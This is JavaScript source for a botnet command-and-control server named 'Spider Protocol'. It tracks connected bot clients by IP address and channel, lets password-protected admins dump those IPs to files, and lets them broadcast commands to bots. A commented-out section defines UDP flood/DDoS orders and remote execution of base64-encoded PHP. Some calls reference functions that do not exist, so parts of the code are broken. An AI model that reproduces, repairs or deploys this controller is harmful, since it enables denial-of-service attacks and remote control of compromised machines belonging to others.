var net = require('net'),
fs = require('fs'),
colors = [],
events = [],
socks = {},//all sockets
users = [],//logged in users
admins = [],
channels = {},
settings = false,
usage = "@login <Nickname> <password/channel>\r\n@users #View users/admins/channels\r\n@ignore/listento #[all<events,users,channels>, event, user, channel]\r\n@events #Shows all events that've fired since runtime\r\n@logout #Close connection\r\n@exit #Close server\r\n@send [users, user:ip, admins, admin:username, channels]\r\n\r\n===================\r\n= Spider Protocol =\r\n===================";

colors['black'] = '0;30';
colors['dark_gray'] = '1;30';
colors['blue'] = '0;34';
colors['light_blue'] = '1;34';
colors['green'] = '0;32';
colors['light_green'] = '1;32';
colors['cyan'] = '0;36';
colors['light_cyan'] = '1;36';
colors['red'] = '0;31';
colors['light_red'] = '1;31';
colors['purple'] = '0;35';
colors['light_purple'] = '1;35';
colors['brown'] = '0;33';
colors['yellow'] = '1;33';
colors['light_gray'] = '0;37';
colors['white'] = '1;37';

function color(str, color){
	if(typeof color == 'undefined') color = 'cyan';
	var colored_string = str;
	if(colors[color] != 'undefined'){
		colored_string = "\033["+colors[color]+"m"+str+"\033[0m";
	}
	return colored_string;
}

function loadConfig(){
	try{
		settings = JSON.parse(fs.readFileSync("botnet_cfg.json"));
	} catch(e){
		console.log("Missing config file! "+e);
		process.exit();
	}
}

function socktype(signature){
	if(socks[signature].isAdmin) return 'ADMIN='+socks[signature].user;
	if(socks[signature].loggedIn) return 'USER';
	return 'GUEST';
}

function me(socket, message){
	socket.write(message+"\n");
}

function generateSignature(socket){
	return socket.remoteAddress.toString()+":"+socket.remotePort.toString();
}

var server = net.createServer();

//this is like the old bots but more globalized
var channel = {
		/*
		note: channel.channels[channel_room][integer_index] returns only the signature, use socks[signature] to fetch the socket object for writing
		*/
		fetchChannels: function(){
			var temp = [];
			for(var channel in channels){
				temp.push(channel);
			}
			return temp;
		},
		exists: function(channel){
			return channels.hasOwnProperty(channel);
		},
		contains: function(channel, signature){
			/*returns the index of the signature witin the channel if it exists*/
			var index = channels[channel].indexOf(signature);
			if(index != -1){
				return index;
			}
			return -1;
		},
		create: function(channel){
			/*creates channel only if it's alphanumerical and only contains underlines (prevents contradictions with commands using specific channel)*/
			var reg = "^[a-zA-Z0-9_]*$";
			if(channel.match(reg) && channel.length <= 15){
				channels[channel] = [];
				server.broadcast.event('channel_created', color("New channel created: ", "light_purple")+color(channel, "yellow"));
				return;
			}
		},
		remove: function(channel){
			delete channels[channel];
		},
		removeSignatureFromChannel: function(signature, channel){
			if(this.exists(channel)){
				var index = this.contains(channel, signature)
				if(index != -1){
					channels[channel].splice(index, 1);
					return;
				}	
			}
		},
		assign: function(signature, channel){
			/*assign a client to a channel by signature*/
			if(!this.exists(channel) && settings.server.create_channel_auto){
				if(this.create(channel)){
					this.assign(signature, channel);
					return true;
				}
			} else {
				return false;
			}
			var index = this.contains(channel, signature);
			if(index == -1){
				channels[channel].push(signature);
				return true;
			}
			return false;
		},
		select: function(cb, channel){
			/*cb will be called here with every socket object inside the selected channel*/
			var found = false,
			sent = 0;
			if(this.exists(channel)){
				
				for(var signature_index = 0; signature_index < channels[channel].length;signature_index++){
					cb(socks[channels[channel][signature_index]]);
					sent++;		
				}
				found = true;
			}
			return {found: found, sent: sent};
		}
		
	}

var sockets = {
	
	exists: function(signature){
		return socks.hasOwnProperty(signature);
	},
	remove: function(signature){
		delete socks[signature];
	},
	select_all: function(cb){
		for(var socket in socks){
			if(socks.hasOwnProperty(socket)){
				socket.sig = 
				cb(socket);
			}
		}
	},
	select: function(cb, select, compare){
		var found = false;
		for(var signature in socks){
			if(socks.hasOwnProperty(signature)){
				var socket = socks[signature];
				if(socket[select] == compare) {
					socket.sig = (socket.remoteAddress.toString()+":"+socket.remotePort.toString());
					cb(socket);
					found = true;
				}
			}
		}
		return found;
	},
	isOnline: function(ip){
		for(var socket in socks){
			if(socks.hasOwnProperty(socket)){
				if(socket.remoteAddress == ip) {
					return true;
				}
			}
		}
		return false;
	}
}

var user = {
	//logged in users
	add: function(signature){
		users.push(signature);
	},
	index: function(signature){
		return users.indexOf(signature);
	},
	del: function(signature){
		users.splice(this.index(signature), 1);
	},
	all_users: function(cb){
		for(var i = 0;i < users.length;i++){
			cb(users[i]);
		}
	},
	listeningToUser: function(signature, opposing_signature){
		/*
		both arrays empty: listening to all users
		listen empty but ignore not: ignoring certain users
		ignore empty but listen not: listening only to certain users
		ignoreall set true: ignore all users
		*/
		var ignore_index = socks[signature].ignoring.users.indexOf(opposing_signature);
		var listen_index = socks[signature].listening.users.indexOf(opposing_signature);
		if((ignore_index == -1 && listen_index != -1)){
			return {listening: true, index: listen_index};
		}
		if(listen_index == -1 && ignore_index == -1){
			return {listening: true, index: -1};
		}
		return {listening: false, index: ignore_index};
	},
	ignoreUser: function(signature, opposing_signature){
		socks[signature].ignoring.all_users = false;
		var lobj = this.listeningToUser(signature, opposing_signature);
		if(lobj.listening){
			socks[signature].ignoring.users.push(opposing_signature);
			if(lobj.index != -1) socks[signature].listening.users.splice(lobj.index, 1);
		}
	},
	ignoreAllUsers: function(signature){
		socks[signature].ignoring.all_users = true;
	},
	ignoreAllUsersBut: function(signature, opposing_signature){
		socks[signature].ignoring.all_users = false;
		socks[signature].listening.users = [];
		socks[signature].listening.users.push(opposing_signature);
		socks[signature].ignoring.users = [];
	},
	listenToUser: function(signature, opposing_signature){
		socks[signature].ignoring.all_users = false;
		var lobj = this.listeningToUser(signature, opposing_signature);
		if(!lobj.listening){
			if(lobj.index != -1) socks[signature].ignoring.users.splice(lobj.index, 1);
		}
	},
	listenToAllUsers: function(signature){
			socks[signature].ignoring.all_users = false;
			socks[signature].ignoring.users = [];
			socks[signature].listening.users = [];
	},
	listenToAllUsersBut: function(signature, opposing_signature){
		socks[signature].ignoring.all_users = false;
		socks[signature].listening.users = [];
		socks[signature].ignoring.users = [];
		socks[signature].ignoring.users.push(opposing_signature);
	},
	listeningToChannel: function(signature, channel_name){
		/*
		both arrays empty: listening to all channels
		listen empty but ignore not: ignoring certain channels
		ignore empty but listen not: listening only to certain channels
		ignoreall set true: ignore all channels
		*/
		if(socks[signature].ignoring.all_channels) return {listening: false};
		var ignore_index = socks[signature].ignoring.channels.indexOf(channel_name);
		var listen_index = socks[signature].listening.channels.indexOf(channel_name);
		if((ignore_index == -1 && listen_index != -1)){
			return {listening: true, index: listen_index};
		}
		if(listen_index == -1 && ignore_index == -1){
			return {listening: true, index: -1};
		}
		return {listening: false, index: ignore_index};
	},
	ignoreChannel: function(signature, channel_name){
		socks[signature].ignoring.all_channels = false;
		var lobj = this.listeningToChannel(signature, channel_name);
		if(lobj.listening){
			socks[signature].ignoring.channels.push(channel_name);
			if(lobj.index != -1) socks[signature].listening.channels.splice(lobj.index, 1);
		}
	},
	ignoreAllChannels: function(signature){
		socks[signature].ignoring.all_channels = true;
	},
	ignoreAllChannelsBut: function(signature, channel_name){
		socks[signature].ignoring.all_channels = false;
		socks[signature].listening.channels = [];
		socks[signature].listening.channels.push(channel_name);
		socks[signature].ignoring.channels = [];
	},
	listenToChannel: function(signature, channel_name){
		socks[signature].ignoring.all_channels = false;
		var lobj = this.listeningToChannel(signature, channel_name);
		if(!lobj.listening){
			if(lobj.index != -1) socks[signature].ignoring.channels.splice(lobj.index, 1);
		}
	},
	listenToAllChannels: function(signature){
			socks[signature].ignoring.all_channels = false;
			socks[signature].ignoring.channels = [];
			socks[signature].listening.channels = [];
	},
	listenAllChannelsBut: function(signature, channel_name){
		socks[signature].ignoring.all_channels = false;
		socks[signature].listening.channels = [];
		socks[signature].ignoring.channels = [];
		socks[signature].ignoring.channels.push(channel_name);
	},
	subbedToEvent: function(signature, event){
		/*
		both arrays empty: listening to all events
		listen empty but ignore not: ignoring certain events
		ignore empty but listen not: listening only to certain events
		ignoreall set true: ignore all events
		*/
		var ignore_index = socks[signature].ignoring.events.indexOf(event);
		var listen_index = socks[signature].listening.events.indexOf(event);
		if((ignore_index == -1 && listen_index != -1)){
			return {listening: true, index: listen_index};
		}
		if(listen_index == -1 && ignore_index == -1){
			return {listening: true, index: -1};
		}
		return {listening: false, index: ignore_index};
	},
	ignoreEvent: function(signature, event){
		socks[signature].ignoring.all_events = false;
		var lobj = this.subbedToEvent(signature, event);
		if(lobj.listening){
			socks[signature].ignoring.events.push(event);
			if(lobj.index != -1) socks[signature].listening.events.splice(lobj.index, 1);
		}
	},
	ignoreAllEvents: function(signature){
		socks[signature].ignoring.all_events = true;
	},
	ignoreAllEventsBut: function(signature, event){
		socks[signature].ignoring.all_events = false;
		socks[signature].listening.events = [];
		socks[signature].listening.events.push(event);
		socks[signature].ignoring.events = [];
	},
	subscribeToEvent: function(signature, event){
		socks[signature].ignoring.all_events = false;
		var lobj = this.subbedToEvent(signature, event);
		if(!lobj.listening){
			if(lobj.index != -1) socks[signature].ignoring.events.splice(lobj.index, 1);
		}
	},
	subscribeToAllEvents: function(signature){
			socks[signature].ignoring.all_events = false;
			socks[signature].ignoring.events = [];
			socks[signature].listening.events = [];
	},
	subscribeToAlleventsBut: function(signature, event){
		socks[signature].ignoring.all_events = false;
		socks[signature].listening.events = [];
		socks[signature].ignoring.events = [];
		socks[signature].ignoring.events.push(event);
	}
};

var admin = {
	//index signature in array instead of copying socket object
	add: function(signature){
		admins.push(signature);
	},
	index: function(signature){
		return admins.indexOf(signature);
	},
	del: function(signature){
		admins.splice(this.index(signature), 1);
	},
	all_admins: function(cb){
		for(var i = 0;i < admins.length;i++){
			cb(admins[i]);
		}
	}
}

server.broadcast = {
	send: function(to, message, sender){
		if(typeof sender == "undefined") return;
		var from_signature = (sender.remoteAddress.toString()+":"+sender.remotePort.toString());
		var commands = [],
		regex = /\[(.*)\]/;
		if(to.match(regex)){
			var matches = regex.exec(to);
			commands = matches[1].replace(/\s+/g, '').split(",");
		} else {
			commands.push(to);
		}
		for(var cmd_i = 0;cmd_i < commands.length;cmd_i++){
			var rdata = commands[cmd_i].split(":");
				switch(rdata[0]){
					case 'users':
						user.all_users(function(signature){socks[signature].write(message);return true;});
						break;
					case 'user':
						if(sockets.select(function(socket){socket.write(message+"\n");}, "remoteAddress", rdata[1])) {
							sender.write(color("Sent to "+rdata[1]+"\n", "green"));
						} else {
							sender.write(color(rdata[1]+" is not connected to this server.\n", "red"));
						}
						break;
					case 'channel':
						var selchan = channel.select(function(socket){socket.write(message);}, rdata[1]);
						if(selchan.found){
							sender.write(color("Sent to "+selchan.sent+" clients in channel: ", "green")+color(rdata[1], "light_purple")+"\n");
						} else {
							sender.write(color(rdata[1], "light_blue")+color(" hass't been created yet!\n", "red"));
						}
						break;
					case 'admins':
						admin.all_admins(function(signature){
							if(user.listeningToChannel(signature, sender.channel).listening){
								if(user.listeningToUser(signature, from_signature)){
									socks[signature].write(message+"\n");
								}
							}
						});
						break;
					case 'admin':
						if(sockets.select(function(socket){
								if(user.listeningToChannel(socket.sig, sender.channel).listening){
									if(user.listeningToUser(socket.sig, generateSignature(sender))){
										socket.write(message+"\n");
									}
								}
						}, "user", rdata[1])) {
							sender.write(color("Sent to "+rdata[1]+"\n", "light_green"));
						} else {
							if(sockets.select(function(socket){socket.write(message+"\n");}, "remoteAddress", rdata[1])) {
								sender.write(color("Sent to "+rdata[1]+"\n", "light_green"));
							} else {
								sender.write(color(rdata[1]+" isn't online!\n", "light_red"));
							}
						}
						break;
				}
		}
	}, 
	event: function(event, message){
		if(events.indexOf(event) == -1) events.push(event);
		//console.log(message);
		admin.all_admins(function(signature){
			if(!socks[signature].ignoring.all_events && user.subbedToEvent(signature, event).listening){
				socks[signature].write(message+"\n");
			}
		});
	}
}

server.on("connection", function(socket){
	
	socket.sig = generateSignature(socket);
	socks[socket.sig] = socket;
   
   setTimeout(function(){
	   if(!socket.loggedIn) socket.destroy();
   }, 8000);
   
   socket.on('data', function(data) {
		var dsplit = data.toString().split(" ");
		var cmd = dsplit[0].toLowerCase();
		dsplit.splice(0, 1);
		var args = dsplit;
		args.length == 0 ? cmd = cmd.trim() : args[args.length-1] = args[args.length-1].trim();
		var type = socktype(socket.sig);
		switch(cmd){
			case '@login':
				if(!socks[socket.sig].isAdmin && !socks[socket.sig].loggedIn){
					if(args.length > 0){
						if(args[0] == "guest"){
							args.splice(0, 1);
							var channel_name = args.length == 0 ? 'default' : args.join("_");
							channel.assign(socket.sig, channel_name);
							socks[socket.sig].channel = channel_name;
							socks[socket.sig].loggedIn = true;
							user.add(socket.sig);
							//me(socket,"logged in!");
						} else {
							if(settings.admins.hasOwnProperty(args[0])){
								if(settings.admins[args[0]].password == args[1]){
									socket.chat_color = settings.admins[args[0]].chat_color;
									//admins[socket.sig] = client;
									socks[socket.sig].show_server_log = true;
									socks[socket.sig].isAdmin = true;
									socks[socket.sig].user = args[0];
									socks[socket.sig].loggedIn = true;
									socks[socket.sig].ignoring = settings.admins[args[0]].ignoring;
									socks[socket.sig].listening = settings.admins[args[0]].ignoring;
									admin.add(socket.sig);
									me(socket, color(usage, "yellow"));
									server.broadcast.event('new_admin_login', color('Admin '+socks[socket.sig].user+' logged in.','purple'));
								}
							}
						}
					}
				}
				break;
			case '@events':
				if(socks[socket.sig].isAdmin){
					me(socket,"Fired events: ("+events.join(", ")+")");
				}
			break;
			case '@users':
				if(socks[socket.sig].isAdmin){
						if(args.length > 0){
						param = args[0].split(":");
						funct = param[0];
						param.splice(0, 1);
								switch(funct.toUpperCase()){
									case 'LIST':
										if(param.length >= 1){
											var all = param[0] == 'all' ? true : false,
											limit = param[1] == 'all' ? false : param[1],
											count = 0,
											found = 0,
											save = Boolean(param[2]) || false,
											str = [];
											if(all){
												if(!limit){
													limit = users.length;
												} else {
													if(limit > users.length){	
													limit = users.length;
													}
												}
											}
											for (var sigi = 0;sigi < users.length;sigi++) {
												var signature = users[sigi];
												if(limit) {if(count >= limit) break;}
													if(all){
														str.push(socks[signature].remoteAddress);
														found++;
													} else {
														if(socks[signature].channel == param[0]) {
															str.push(socks[signature].remoteAddress);
															found++;
														}

													}
												count++;
											}
											
											if(found > 0){
												me(socket,color("Listing " + found + " users!", "yellow")+"\r\n("+str.join(", ")+")");
												if(save) fs.writeFileSync(param[2], "User IP Dump for "+param[0]+"\n\n"+str.join('\n'), { flags: 'w' });
											} else {
												me(socket,color("No users to list using "+param[0]+"!", "red"));
											}
										} else {
											me(socket,color("Usage:\r\n@users [list:*<all,channel_id>:<ammount/all>:<save_output file>]", "yellow"));
										}
										break;
								}
						} else {
							var temp = [];
							for (var sigi = 0;sigi < admins.length;sigi++) {
							var signature = admins[sigi];
									temp.push(socks[signature].user);
							}
							var adm_str = admins.length == 0 ? '' : " ("+temp.join(", ")+")";
							var chan_str = Object.keys(channels).length == 0 ? '' : " ("+channel.fetchChannels().join(", ")+")";
							me(socket,color("Users: "+users.length+" - Channels: "+Object.keys(channels).length+chan_str+"\r\nAdmins: "+admins.length+adm_str+"\n"+color("Try @users list for more detailed information.", "yellow")));
						}
				}
				break;
			case '@ignore':
			case '@listento':
				if(socks[socket.sig].isAdmin){
						if(args.length > 0){
							var ignore = cmd == "@ignore" ? true : false;
							var cmd = args.join(" ");
							var commands = [],
							regex = /\[(.*)\]/;
							if(cmd.match(regex)){
								var matches = regex.exec(cmd);
								commands = matches[1].replace(/\s+/g, '').split(",");
							} else {
								commands.push(cmd);
							}
							for(var cmd_i = 0;cmd_i < commands.length;cmd_i++){
								var rdata = commands[cmd_i].split(" ");
								switch(rdata[0]){
									case 'all':
										switch(rdata[1]){
											case'users':
												if(rdata[2] != "but"){
													if(ignore){
														user.ignoreAllUsers(socket.sig);
														me(socket,color("You are now ignoring "+Object.keys(sockets).length+" users", "yellow"));
													} else {
														user.listenToAllUsers(socket.sig);
														me(socket,color("You are now listening to "+Object.keys(sockets).length+" users", "light_green"));
													}
												} else {
													if(ignore){
														user.ignoreAllUsersBut(socket.sig, rdata[3]);
														me(socket,color("You are now ignoring all users but "+rdata[3], "yellow"));
													} else {
														user.listenToAllUsersBut(socket.sig, rdata[3]);
														me(socket,color("You are now listening to all users but "+rdata[3], "yellow"));
													}
												}
												break;
											case 'channels':
												if(rdata[2] != "but"){
													if(ignore){
														user.ignoreAllChannels(socket.sig);
														me(socket,color("You are now ignoring ", "yellow")+color("all channels", "light_blue"));
													} else {
														user.listenToAllChannels(socket.sig);
														me(socket,color("You are now listening to ", "yellow")+color("all channels", "light_blue"));
													}
												} else {
													if(ignore){
														user.ignoreAllChannelsBut(socket.sig, rdata[3]);
														me(socket,color("You are now ignoring all channels but "+rdata[3], "yellow"));
													} else {
														user.listenToAllChannelsBut(socket.sig, rdata[3]);
														me(socket,color("You are now listening to all channels but "+rdata[3], "light_green"));
													}
												}
												break;
											case 'events':
												if(rdata[2] != "but"){
													if(ignore){
														user.ignoreAllEvents(socket.sig);
														me(socket,color("You are now ignoring all events.", "yellow"));
													} else {
														user.subscribeToAllEvents(socket.sig);
														me(socket,color("You are now subscribed to all events", "light_green"));
													}
												} else {
													if(ignore){
														user.ignoreAllEventsBut(socket.sig, rdata[3]);
														me(socket,color("You are now ignoring all events except ", "light_red")+color(rdata[3], "light_blue"));
													} else {
														user.subscribeToAlleventsBut(socket.sig, rdata[3]);
														me(socket,color("You are now subscribed to all events except ", "light_green")+color(rdata[3], "light_blue"));
													}
												}
											break;
										}
										break;
									case 'user':
										var signature = user.online(rdata[1]);
										if(signature){
											if(ignore){
												user.ignoreUser(socket.sig, signature);
												server.broadcast.send('me', color("You are now ignoring "+rdata[1], "light_green"), true);
											} else {
												user.listenToUser(socket.sig, signature);
												server.broadcast.send('me', color("You are now listening to "+rdata[1], "light_green"), true);
											}
										} else {
											me(socket,color("That user wasn't found!", "light_red"), true);
										}
										break;
									case 'channel':
										if(channel.exists(rdata[1])){
											if(ignore){
												user.ignoreChannel(socket.sig, rdata[1]);
												me(socket,color("You are now ignoring channel ","light_red")+color(rdata[1], "light_blue"));
											} else {
												user.listenToChannel(socket.sig, rdata[1]);
												me(socket,color("You are now listening to channel ","light_green")+color(rdata[1], "light_blue"));
											}
										} else {
											me(socket,color("That channel wasn't found!", "light_red"));
										}
										break;
									case 'event':
										if(ignore){
											user.ignoreEvent(socket.sig, rdata[1]);
											me(socket,color("You are now ignoring event ","light_red")+color(rdata[1], "light_blue"));
										} else {
											user.subscribeToEvent(socket.sig, rdata[1]);
											me(socket,color("You are now subscribed to event ","light_green")+color(rdata[1], "light_blue"));
										}
										break;
								}
							}
						} else {
							me(socket,color("Usage:\r\n@ignore [users, user:user_ip, channel:channel_id]\r\n@listen [users, user:user_ip, channel:channel_id]", "yellow"));
						}
				}
				break;
			case "@help":
			case "@use":
			case "@usage":
					if(socks[socket.sig].isAdmin){
						me(socket,color(usage, 'yellow'));
					}
				break;
			case "@logout":
				if(!socks[socket.sig].loggedIn) return;
					socks[socket.sig].destroy();
				break;
			case "@exit":
				if(socks[socket.sig].isAdmin){
					server.broadcast.event('server_closing', color("Server closing."));
					process.exit();
				}
				break;
			case "@send":
			//channel SpiderNet
				if(socks[socket.sig].isAdmin){
					if(args.length > 1){
						var send_to = args[0];
						args.splice(0, 1);
						cmd_send = args.join(" ");
						//args.splice(0, 1);
						server.broadcast.send(send_to, cmd_send, socket);
						/*
						switch(cmd_send.toUpperCase()){
							case 'UDPFLOOD':
							case 'UDP':
							case 'DDOS':
							case 'DOS':
							case 'FLOOD':
								if(args.length > 3){
									host = args[2];
									time = args[3];
									port = args[4] || 80;
									psize = args[5] || 65500;
									threads = args[6] || 10;
									server.broadcast(send_to, ":udpflood "+host + " " + time + " " + port + " " + psize + " " + threads);
									me(socket,color("Command sent to "+send_to+" :udpflood "+host + " " + time + " " + port + " " + psize + " " + threads, 'orange'));
								} else {
								me(socket,color("Usage: @send "+ send_to +" " + cmd_send + " host time port? psize? threads?", 'yellow'));	
								}
								break;
							case 'RUN':
								if(args.length > 1){
									var eval = args[2];
									server.broadcast(send_to, color("Command sent to "+send_to+" :eval "+eval, 'red'));
								} else {
									me(socket,color("Usage: @send "+send_to+" "+cmd_send+" [PHP as Base64] #Runs base64 encoded string as PHP", 'yellow'));
								}
								break;
							case 'SPEAK':
								if(args.length > 3){
									var speak = args[2];
									server.broadcast(send_to, ":speak "+speak);
									me(socket,color("Command sent to "+send_to+" :speak "+speak, 'red'));
								}
								break;
							default:
								args.splice(0, 1);
								server.broadcast(send_to, args.join(" "));
								break;
						}*/
					} else {
						me(socket,color('Usage - @send [all<all users & admins>, users, client:specific_client_ip, channel:specific_channel, admin:specific_admin_username]', 'yellow'));
					}
				}
				break;
			default:
				var colorz = socket.chat_color || 'cyan';
				var channel_str = "";
				if(!socks[socket.sig].isAdmin && socks[socket.sig].hasOwnProperty('channel')){
					channel_str = "["+color(socks[socket.sig].channel, "blue")+"]";
				}
				if(data.toString().trim() != '') {
					if(socks[socket.sig].loggedIn) server.broadcast.send("admins", color("[", "light_gray")+color(socktype(socket.sig), colorz)+"]"+channel_str+color("[", "brown")+socket.remoteAddress+color("]", "brown")+": "+color(data, colorz), socket);
				}
			break;
		}
   });
   
   socket.on('close', function() {
		var tuser = false,
		chan = "";
		if(socks[socket.sig].hasOwnProperty('channel')){
			chan = "Left channel: "+color(socks[socket.sig].channel, "light_green");
		}
		if(socks[socket.sig].loggedIn) {
			tuser = socks[socket.sig].user || socket.sig;
			user.del(socket.sig);
			if(socks[socket.sig].isAdmin) admin.del(socket.sig);
			channel.removeSignatureFromChannel(socket.sig, socket.channel);
			delete socks[socket.sig];
		}
	  
   });
   socket.on('error', function(err) {
   });
});

function removeDup(){
	if(settings.server.allow_dups) return;
	for (var signature1 in socks) {
			found = 0;
			if(socks[signature1].isLoggedIn){
				for (var signature2 in socks) {
					if(socks[signature1].remoteAddress == socks[signature2].remoteAddress) found++;
				}
			}
			if(found > 1){
				socks[signature1].write("DUP");
				socks[signature1].destroy();
				server.broadcast("duplicate", color("Removed duplicate socket: ", "cyan")+color(signature1, "light_red"));
			}
	}
}

function handleInactiveChannel(){
	for	(var chan in channels){
		if(channels.hasOwnProperty(chan)){
			if(channels[chan].length == 0){
				channel.remove(chan);
				server.broadcast.event("channel_removed", color("Removed channel no longer in use: ", "cyan")+color(chan, "light_red"));
			}
		}
	}
}

loadConfig();
server.listen(settings.server.port, function() { 
  console.log('Started, listening on port: '+settings.server.port);
  arc = settings.server.auto_remove_empty_channels;
  setInterval(handleInactiveChannel, 3000);
  setInterval(removeDup, 3000);
});

process.on('exit', function(code) {
	admin.all_admins(function(signature){
		settings.admins[socks[signature].user].ignoring = socks[signature].ignoring = socks[signature].ignoring;
		settings.admins[socks[signature].user].listening = socks[signature].listening = socks[signature].listening;
	});
	if(settings) fs.writeFileSync("botnet_cfg.json", JSON.stringify(settings), { flags: 'w' });
});